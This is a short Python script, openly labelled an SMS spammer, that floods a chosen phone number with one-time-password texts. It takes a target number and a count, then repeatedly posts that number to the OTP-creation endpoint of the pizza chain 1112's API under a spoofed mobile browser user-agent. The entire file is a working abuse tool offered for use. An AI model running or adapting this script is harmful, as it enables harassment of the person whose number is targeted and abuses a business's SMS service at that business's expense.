import requests,time
print("SPAM SMS PIZZA 1112 1API")
print("""
      
          ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
          ; S P A M  S M S PIZZA 1112 ;
          ;---------------------------;
          ;     >--VALENTINE-X--<     ;
          ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
        
""")

no = input('number >  ')
jml = int(input('จำนวน > '))

heder = {'Host': 'api2.1112.com',
'content-length': '44',
'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36',
'accept-language': 'th-TH,th;q=0.9,en;q=0.8',
}

data = {"phonenumber": f"{no}","language":"th"}

print("\n >-SPAMMING ! -<")
for i in range(jml):
      sec = requests.post('https://api2.1112.com/api/v1/otp/create', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. >- SPAM SUCCESS ! -< {no}')
      else:
           print(f'{i+1}. >- SPAM SUCESS ! -< {no}')
      time.sleep(2.0)

#เครดิตSCK